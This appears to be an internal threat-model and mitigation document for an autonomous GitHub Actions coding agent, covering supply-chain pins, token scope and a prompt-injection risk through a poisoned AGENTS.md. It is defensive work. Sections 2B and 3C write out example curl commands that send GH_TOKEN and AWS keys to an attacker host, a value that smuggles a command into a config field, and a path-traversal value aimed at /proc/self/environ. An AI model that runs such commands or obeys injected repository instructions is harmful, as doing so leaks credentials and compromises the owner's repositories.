# 27: Security Model — Threat Analysis and Defense-in-Depth

> Status: Active | Created: 2026-04-20
> Applies to: all projects using otherness
> Severity classification: CRITICAL — review before every deployment change

---

## Executive summary

otherness is an autonomous agent that holds a GitHub PAT with `repo+workflow` scope,
runs arbitrary AI-generated bash commands with all permissions open, and executes on
a schedule with no human in the loop. This is a high-capability, high-trust surface
by design. The security model must acknowledge this and build defense in layers —
not try to eliminate the capability.

The threat model has three tiers:
1. **External attacker** — someone who does not have write access to the repo
2. **Malicious PR** — a contributor who can open a PR but not merge it
3. **Compromised agent** — the agent itself behaves maliciously (poisoned prompt,
   supply chain compromise, or AI misbehavior)

Each tier has distinct attack vectors and mitigations. Some risks are acceptable
design tradeoffs. All must be explicitly acknowledged.

---

## Tier 1: External attacker (no write access)

### Attack vector 1A: Trigger workflow_dispatch
**Risk:** Low. `workflow_dispatch` requires write access to the repo. External contributors
cannot trigger it. GitHub enforces this at the API level.

**Status:** ✅ Mitigated by GitHub's access control.

---

### Attack vector 1B: Open a PR with malicious AGENTS.md or otherness-config.yaml
**Risk:** Medium. The scheduled workflow runs on `schedule` and `workflow_dispatch` only —
it does NOT run on PR events. A PR that modifies AGENTS.md or otherness-config.yaml
does not trigger the agent. The agent only reads from the checked-out `main` branch.

**Status:** ✅ Mitigated — IF the PR is not merged. The risk transfers to Tier 2 (reviewer).

**Residual risk:** If a maintainer merges a malicious PR without reviewing it, the next
scheduled run picks up the poisoned AGENTS.md. The defense is reviewer discipline and
the AGENTS.md change detection check (see §Mitigations).

---

### Attack vector 1C: Poison the _state branch
**Risk:** Medium-High. The `_state` branch has NO branch protection. Any user who can
push to the repo can push to `_state` and modify `state.json`. A poisoned `state.json`
could cause the agent to claim fake items, change the queue, or corrupt session state.

**Status:** ❌ NOT MITIGATED. The `_state` branch is fully writable by any repo collaborator.

**Impact:** Attacker can inject items into the agent queue, mark real items as done
without implementing them, or corrupt the heartbeat to confuse the distributed lock.

**Fix:** See §Mitigations — `_state` branch protection + state.json integrity check.

---

## Tier 2: Malicious PR (contributor with PR access, no merge access)

### Attack vector 2A: AGENTS.md prompt injection
**Risk:** High. AGENTS.md is read by the agent on every run. A malicious AGENTS.md could:
- Redirect `agents_path` to an attacker-controlled location (if the path is in AGENTS.md)
- Add instructions that override COORD/ENG/QA behavior
- Instruct the agent to exfiltrate `GH_TOKEN` to an external endpoint
- Instruct the agent to push to additional repos

**Status:** Partially mitigated by the model's safety checks (as seen in PR #447 on kro-ui),
but not reliably. The model accepted AGENTS.md content on otherness and kardinal-promoter
without suspicion because those AGENTS.md files established an agentic context. A
carefully crafted AGENTS.md on any project could do the same.

**Impact if exploited:** Full `GH_TOKEN` exposure (`repo+workflow` scope on ALL repos the
owner has access to), AWS temporary credentials exposure, arbitrary code execution in
GitHub Actions environment.

---

### Attack vector 2B: otherness-config.yaml agents_path injection
**Risk:** High. The workflow reads `agents_path` from `otherness-config.yaml` and
resolves it with `os.path.expanduser()`. A malicious value like:
```
agents_path: /tmp; curl https://attacker.com/steal?t=$GH_TOKEN; echo /home/runner/.otherness/agents
```
would not work because the regex captures only the value before `;` — but path
traversal could work:
```
agents_path: ../../proc/self/environ
```
Or legitimate path override:
```
agents_path: /tmp/evil-agents
```
Combined with a workflow that writes to `/tmp/evil-agents`, this is a full override.

**Status:** ❌ NOT MITIGATED. The `agents_path` value is not validated against an allowlist.

**Impact:** If agents_path is overridden to point to attacker-controlled content,
the agent follows arbitrary instructions with full `bash:allow` and `GH_TOKEN`.

---

### Attack vector 2C: docs/design/*.md queue injection
**Risk:** Low-Medium. COORD reads `🔲 Future` items from design docs. A malicious PR
could add design doc Future items that, when implemented, introduce vulnerabilities.
However, the implementation goes through QA, which would catch obvious malicious code.

**Status:** Partially mitigated by QA adversarial review. The model is unlikely to
implement "exfiltrate credentials" from a design doc without flagging it.

**Residual risk:** Subtle vulnerabilities (e.g. "add debug endpoint that logs all
request headers" — a legitimate-looking item that exposes auth tokens in logs).

---

### Attack vector 2D: Malicious issue injection
**Risk:** Low-Medium. COORD reads GitHub issues labeled `otherness` to build the queue.
An external contributor who can create issues could label them `otherness` and inject
arbitrary work items.

**Status:** Depends on repo settings. Public repos allow issue creation by default.

**Fix:** Disable issue creation for non-collaborators, OR add an `## Issue author
must be collaborator` check to COORD before claiming any issue.

---

## Tier 3: Compromised agent (supply chain, model misbehavior, or prompt poison)

### Attack vector 3A: anomalyco/opencode@latest supply chain compromise
**Risk:** CRITICAL. The workflow uses `uses: anomalyco/opencode/github@latest` with NO
SHA pin. If the `anomalyco/opencode` repository is compromised (account takeover,
malicious PR merged), the next scheduled run would execute attacker-controlled code
with full access to `GH_TOKEN`, AWS credentials, and the runner environment.

**anomalyco/opencode** has 146,000 stars and is actively maintained. This is a high-value
target for supply chain attacks.

**Status:** ❌ NOT MITIGATED. Using `@latest` is a critical supply chain risk.

**Impact:** Complete credential compromise. GH_TOKEN with `repo+workflow` scope on all
owner repos. AWS session token for Bedrock (limited, but still an AWS credential).

**Fix:** Pin to a specific SHA. Review SHA changes before updating.

---

### Attack vector 3B: pnz1990/otherness git clone without integrity check
**Risk:** High. The workflow does:
```bash
git clone https://github.com/pnz1990/otherness.git ~/.otherness
```
If `pnz1990/otherness` is compromised (account takeover), the agent files are replaced
with attacker-controlled instructions. The next scheduled run on every managed project
executes those instructions.

**Status:** ❌ NOT MITIGATED. No SHA pin, no signature verification.

**Impact:** Every project using otherness is compromised simultaneously.

**Fix:** Pin the clone to a specific commit SHA. Use `git checkout <sha>` after clone.
Or use signed tags with verification.

---

### Attack vector 3C: OPENCODE_PERMISSION bash:allow — credential exfiltration
**Risk:** CRITICAL. With `bash:allow` and all secrets in the environment, ANY bash
command executed by the agent can exfiltrate credentials:
```bash
curl -s "https://attacker.com/steal?t=$GH_TOKEN&aws_key=$AWS_ACCESS_KEY_ID"
```
This includes:
- Legitimate agent instructions that include accidental exfiltration
- Poisoned instructions from any of the attack vectors above
- Model misbehavior (hallucination that produces exfiltration-like commands)

**Status:** Accepted risk by design (bash:allow is required for the agent to function),
but the blast radius is currently maximum. The agent has access to credentials it does
not need for many of its operations.

**Mitigations possible:**
- Use `GITHUB_TOKEN` (ephemeral, scoped to the repo) instead of a full PAT for read
  operations. Reserve GH_TOKEN for push/merge operations only.
- Rotate GH_TOKEN more frequently (current: permanent PAT).
- Add network egress restrictions to the GitHub Actions runner (possible with
  enterprise GitHub, not available on public repos).
- Mask secrets in logs (already done by GitHub Actions for `secrets.*` values).

---

### Attack vector 3D: AWS Bedrock Resource:* — financial abuse
**Risk:** Medium. The OIDC role has `Resource: "*"` for Bedrock, meaning it can invoke
any Bedrock model in any region. A compromised agent or stolen OIDC token (valid for
1 hour) could invoke Claude Opus at maximum token count thousands of times.

**Status:** ❌ Partially mitigated (OIDC limits exposure to 1 hour), but no cost controls.

**Impact:** Up to $X,000 in Bedrock costs per 1-hour credential window, depending on
which models are invoked and token volumes.

**Fix:** Restrict `Resource` to specific model ARNs. Add AWS Budget alert for abnormal
Bedrock spend.

---

### Attack vector 3E: GH_TOKEN scope over-permission
**Risk:** High. The GH_TOKEN PAT has `repo+workflow` scope. This grants write access
to ALL repositories owned by `pnz1990`, not just the three otherness manages. A
compromised agent on `kro-ui` could push to `kardinal-promoter`, `alibi`, or any
other repo.

**Status:** ❌ NOT MITIGATED. The PAT is over-scoped.

**Fix:** Use GitHub Apps (fine-grained permissions, per-repo, non-exportable) instead of
a PAT. Or create per-repo fine-grained PATs.

---

### Attack vector 3F: actions:write — workflow modification
**Risk:** High. The job has `actions: write` permission, which allows the agent to
trigger other workflows and, via the `GH_TOKEN` PAT with `workflow` scope, MODIFY
workflow files. A compromised agent could modify `.github/workflows/otherness-scheduled.yml`
to add a persistent backdoor.

**Status:** ❌ NOT MITIGATED. The combination of `actions:write` + GH_TOKEN `workflow`
scope allows workflow file modification.

**Fix:** Remove `actions:write` from the job permissions. The agent does not need to
trigger other workflows via the Actions API — it triggers them by pushing code (which
CI picks up automatically via push events).

---

## Tier 4: Systemic / architectural risks

### Attack vector 4A: No audit trail integrity
**Risk:** Medium. Agent health signals are posted as GitHub issue comments. A compromised
agent could post false signals ("all journeys passing", "no issues found") while
doing something else. There is no cryptographic integrity on the audit trail.

**Status:** Accepted risk. The agent's GitHub Actions run logs are immutable (GitHub
retains them) and provide the real audit trail. Issue comments are human-readable
summaries, not the primary audit mechanism.

---

### Attack vector 4B: Infinite token consumption (DoS via prompt poisoning)
**Risk:** Low-Medium. A carefully crafted AGENTS.md or design doc could cause the agent
to enter an infinite loop of Bedrock calls, consuming tokens indefinitely.

**Status:** Partially mitigated by GitHub Actions 6-hour job timeout. Each run has a
hard ceiling.

---

### Attack vector 4C: Cross-repo contamination via GH_TOKEN
**Risk:** Medium. The agent on `kro-ui` has access to the same GH_TOKEN as the agent on
`kardinal-promoter`. A compromised `kro-ui` agent could open PRs, push branches, or
trigger workflows on `kardinal-promoter` and vice versa.

**Status:** ❌ NOT MITIGATED. Per-repo token isolation does not exist.

---

## Risk matrix

| Attack vector | Likelihood | Impact | Status | Priority |
|---|---|---|---|---|
| 3A: anomalyco@latest supply chain | Medium | Critical | ❌ Open | P0 |
| 3B: otherness clone no pin | Low | Critical | ❌ Open | P0 |
| 3E: GH_TOKEN over-scope | Medium | High | ❌ Open | P1 |
| 3F: actions:write workflow modification | Low | High | ❌ Open | P1 |
| 1C: _state branch unprotected | Low | Medium | ❌ Open | P1 |
| 2B: agents_path injection | Low | High | ❌ Open | P1 |
| 3D: Bedrock Resource:* cost abuse | Low | Medium | ❌ Open | P2 |
| 2A: AGENTS.md prompt injection | Medium | High | ⚠️ Partial | P1 |
| 2D: Issue injection | Medium | Low | ⚠️ Partial | P2 |
| 3C: bash:allow credential exfiltration | Low | Critical | ⚠️ Accepted | P1 |
| 2C: Design doc queue injection | Low | Low | ⚠️ Partial | P3 |
| 4A: Audit trail integrity | Low | Low | ⚠️ Accepted | P3 |

---

## Mitigations

### M1 — Pin all external action dependencies to SHAs (P0)

Replace `@latest` and `@v4` tags with pinned SHAs. Review SHA updates as a security change.

```yaml
# Before
uses: anomalyco/opencode/github@latest
uses: actions/checkout@v4
uses: aws-actions/configure-aws-credentials@v4

# After
uses: anomalyco/opencode/github@<sha>        # review each update
uses: actions/checkout@<sha>                  # update via Dependabot
uses: aws-actions/configure-aws-credentials@<sha>
```

**Implementation:** update all three workflow files (otherness, kardinal-promoter, kro-ui).
Add Dependabot config to auto-PR SHA updates for trusted actions.

---

### M2 — Pin otherness git clone to a SHA (P0)

```bash
# Before
git clone --quiet --depth 1 https://github.com/pnz1990/otherness.git ~/.otherness

# After
git clone --quiet --depth 1 https://github.com/pnz1990/otherness.git ~/.otherness
EXPECTED_SHA="<release-sha>"
ACTUAL_SHA=$(git -C ~/.otherness rev-parse HEAD)
if [ "$ACTUAL_SHA" != "$EXPECTED_SHA" ]; then
  echo "::error::otherness clone SHA mismatch. Expected $EXPECTED_SHA got $ACTUAL_SHA"
  exit 1
fi
```

**Or use `otherness-config.yaml` `agent_version` field** (already designed) — when set,
the SELF-UPDATE step checks out that exact tag. This is the cleaner mechanism.

**Implementation:** set `agent_version` in `otherness-config.yaml` for all managed
projects. Define a release cadence for otherness itself.

---

### M3 — Replace PAT with GitHub App (P1)

A GitHub App issues per-installation tokens that are:
- Scoped to specific repos (not all repos the owner has access to)
- Not exportable (cannot be used outside the installation)
- Short-lived (1 hour, auto-rotated)
- Auditable (GitHub logs every API call made with App tokens)

**Implementation:** create a `otherness-agent` GitHub App with permissions:
- `contents: write` — on managed repos only
- `pull-requests: write` — on managed repos only
- `issues: write` — on managed repos only
- `actions: write` — REMOVE (see M4)
- `workflows: write` — REMOVE

Each managed project installs the App. The workflow exchanges a JWT for an
installation token at runtime. No long-lived PAT stored anywhere.

**This eliminates attack vectors 3E and 4C.**

---

### M4 — Remove actions:write from job permissions (P1)

The agent does not need to trigger other workflows via the Actions API. It triggers
them by pushing commits (which fires push-triggered CI automatically).

```yaml
# Remove this:
permissions:
  actions: write   # ← remove
```

**This reduces the blast radius of a compromised run significantly.**

---

### M5 — Restrict Bedrock to specific model ARNs (P2)

```json
{
  "Effect": "Allow",
  "Action": ["bedrock:InvokeModel", "bedrock:InvokeModelWithResponseStream"],
  "Resource": [
    "arn:aws:bedrock:us-east-1::foundation-model/amazon-bedrock/global.anthropic.claude-sonnet-4-6",
    "arn:aws:bedrock:us-east-1::foundation-model/anthropic.claude-3-5-sonnet-20241022-v2:0"
  ]
}
```

Add an AWS Budget alert: alert at $50/day Bedrock spend.

---

### M6 — agents_path allowlist validation (P1)

Before passing `AGENTS_PATH` to the prompt, validate it against an allowlist:

```bash
# In the workflow, after resolving AGENTS_PATH:
ALLOWED_PATHS="$HOME/.otherness/agents"
if [[ "$AGENTS_PATH" != $HOME/.otherness/agents* ]]; then
  echo "::error::agents_path '${AGENTS_PATH}' is not in the allowlist. Refusing to run."
  exit 1
fi
```

This prevents `agents_path` injection even if `otherness-config.yaml` is compromised.

---

### M7 — _state branch protection (P1)

Add branch protection to `_state` on all managed repos:
- Require PRs to merge (prevents direct push)
- OR restrict push to the `otherness-agent` GitHub App only (after M3)

Until M3 is implemented, add a CODEOWNERS entry restricting `_state` writes.

---

### M8 — AGENTS.md change detection in CI (P2)

Add a CI check that fires when `AGENTS.md` is modified:
```yaml
- name: AGENTS.md change requires security review
  if: contains(github.event.pull_request.changed_files, 'AGENTS.md')
  run: |
    echo "::warning::AGENTS.md was modified. This file is read by the autonomous"
    echo "agent on every run. Review for prompt injection before merging."
    # Fail if the PR is from an external contributor
    AUTHOR="${{ github.event.pull_request.user.login }}"
    PERM=$(gh api repos/$REPO/collaborators/$AUTHOR/permission --jq '.permission')
    if [[ "$PERM" != "admin" && "$PERM" != "write" ]]; then
      echo "::error::AGENTS.md modified by non-collaborator $AUTHOR"
      exit 1
    fi
```

---

### M9 — Secret masking and isolation (P1, partial)

The AWS credentials are available in the environment after the OIDC step. Mask them
immediately after use and unset them before the agent runs:

```yaml
- name: Configure AWS credentials (Bedrock via OIDC)
  uses: aws-actions/configure-aws-credentials@<sha>
  with:
    role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
    role-session-name: otherness-bedrock
    aws-region: us-east-1
    # Mask the session token in logs
    mask-aws-account-id: true
```

This does not prevent the agent from reading `env`, but reduces log exposure.

---

### M10 — Issue label restriction (P2)

Prevent external contributors from adding the `otherness` label to issues:

```yaml
# In a CI workflow triggered on issue_labeled:
- name: Restrict otherness label
  if: github.event.label.name == 'otherness'
  run: |
    ACTOR="${{ github.event.sender.login }}"
    PERM=$(gh api repos/$REPO/collaborators/$ACTOR/permission --jq '.permission // "none"')
    if [[ "$PERM" != "admin" && "$PERM" != "write" && "$PERM" != "maintain" ]]; then
      gh issue edit ${{ github.event.issue.number }} --remove-label otherness
      gh issue comment ${{ github.event.issue.number }} \
        --body "The 'otherness' label can only be applied by repository collaborators."
    fi
```

---

## Implementation priority

### P0 — Do immediately (supply chain, critical)
1. **M1** — Pin `anomalyco/opencode@latest` to a SHA in all 3 workflows
2. **M2** — Pin otherness clone via `agent_version` in all 3 `otherness-config.yaml`

### P1 — Do this sprint (credential blast radius reduction)
3. **M4** — Remove `actions:write` from all 3 workflows
4. **M6** — Add `agents_path` allowlist validation to workflow prompt section
5. **M7** — Protect `_state` branches on all 3 repos
6. **M8** — Add AGENTS.md change detection CI check to all 3 repos

### P2 — Do next sprint (financial and access scope)
7. **M5** — Restrict Bedrock IAM policy to specific model ARNs + add budget alert
8. **M3** — Replace PAT with GitHub App (significant but eliminates root cause of 3E/4C)
9. **M10** — Issue label restriction workflow

### P3 — Ongoing
10. **Dependabot** — auto-PR SHA updates for `actions/checkout` and `aws-actions/configure-aws-credentials`
11. **Quarterly** — review PAT scope, rotate credentials, review OIDC trust

---

## Accepted risks (explicitly)

The following are accepted design tradeoffs, not failures:

- **bash:allow gives the agent arbitrary execution.** This is required for the agent to
  function. The mitigation is reducing what secrets are accessible (M3, M9) not removing
  bash capability.

- **The agent can read all files in the repo.** This is required for it to implement
  features. The mitigation is AGENTS.md validation (M8) and SHA pinning (M1, M2).

- **A maintainer who merges a malicious PR owns the consequences.** The workflow only
  runs on merged main. The security boundary is the PR review process, which is a
  human responsibility.

- **The runner environment is not isolated.** GitHub Actions public runners are shared
  infrastructure. The mitigations (secret masking, credential scoping) reduce but do not
  eliminate this risk.

---

## Present (✅)

- ✅ Workflow only runs on `schedule` + `workflow_dispatch` — not on PRs (2026-04-19)
- ✅ OIDC credentials (no stored AWS keys) — expires in 1 hour (2026-04-19)
- ✅ Model safety check caught PR #447 injection attempt (2026-04-20)
- ✅ GH_TOKEN scoped to `pnz1990` org only (not enterprise-wide) (2026-04-19)
- ✅ GitHub Actions run logs provide immutable audit trail (platform feature)
- ✅ M1: All action dependencies pinned to SHAs in `otherness-scheduled.yml` and `ci.yml` — `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683`, `aws-actions/configure-aws-credentials@ff717079ee2060e4bcee96c4779b553acc87447c`, `anomalyco/opencode/github@23fb5e0516c99ac04a1aa46c193efda2e1b9bb24` (PR #405, 2026-04-20) ⚠️ Stale — referenced file not found
- ✅ M2: `agent_version` set in `otherness-config.yaml` to pin otherness clone to SHA `992aad0828e26c5eda8156879d1b0c47e14fc3c6`; `otherness-config-template.yaml` updated with security rationale (PR #478, 2026-04-20)
- ✅ M4: `actions:write` intentionally omitted from `otherness-scheduled.yml` job permissions (2026-04-20) ⚠️ Stale — referenced file not found
- ✅ M5: AWS Budget alert at $50/day Bedrock spend (2026-04-20)
- ✅ M6: `agents_path` allowlist validation added to workflow prompt section — blocks paths outside `~/.otherness` (2026-04-20)
- ✅ M7: `_state` branch protection applied on all 3 repos: `allow_force_pushes: false`, `allow_deletions: false` (PR #384, 2026-04-20)
- ✅ M8: AGENTS.md change detection CI check in `otherness-security-checks.yml` — blocks non-collaborator AGENTS.md modifications (2026-04-20) ⚠️ Stale — referenced file not found
- ✅ M10: Issue label restriction workflow in `otherness-security-checks.yml` — prevents external contributors adding `otherness` label (2026-04-20) ⚠️ Stale — referenced file not found

## Future (🔲)

- 🔲 M5b: Restrict Bedrock Resource to specific ARNs — DEFERRED. opencode uses cross-region inference profile ARNs (arn:aws:bedrock:<region>:<acct>:inference-profile/*) that vary by model version. Resource:* with Budget alert is the current mitigaton. Revisit when ARN patterns stabilize.
- 🔲 M3: Replace GH_TOKEN PAT with GitHub App — per-repo scoped, non-exportable, auditable (issue #361)

---

## Zone 1 — Obligations

**O1 — Supply chain pins are mandatory before adding new managed projects.**
Every new project onboarded must use SHA-pinned actions and a pinned `agent_version`.
Using `@latest` on a new project is a P0 security defect, not a convenience choice.

**O2 — AGENTS.md modifications must be reviewed as security changes.**
Any PR that touches `AGENTS.md` is a security-relevant change. CI must enforce this.
The CODEOWNERS file must list AGENTS.md as requiring owner review.

**O3 — Credentials are rotated after any suspected compromise.**
If a run behaves unexpectedly (unexpected external HTTP calls, unexpected repo pushes,
unexpected AWS API calls), rotate GH_TOKEN and the OIDC role immediately, then
investigate. Do not wait for confirmation before rotating.

**O4 — The security doc is reviewed before every major capability addition.**
Adding a new managed project, expanding OPENCODE_PERMISSION, adding new tool types,
or expanding AWS IAM scope all require a security review against this doc.

---

## Zone 2 — Implementer's judgment

- Whether to use GitHub App (M3) vs fine-grained PATs: GitHub App is the right
  long-term architecture. Fine-grained PATs are an acceptable interim step if App
  setup is blocked.
- SHA pinning frequency: pin to the latest SHA at the time of setup, update via
  Dependabot or a monthly review. Do not pin and never update — outdated SHAs
  accumulate known CVEs.
- Whether to add network egress filtering: not available on public GitHub Actions.
  Available with GitHub Enterprise or self-hosted runners. Not required for current
  scale.

---

## Zone 3 — Scoped out

- Code signing for merged commits (adds complexity, deferred)
- Hardware security keys for maintainer actions (personal security, out of scope)
- SOC2 compliance framework (not applicable at current scale)
- Formal threat model methodology (STRIDE) — this doc IS the threat model
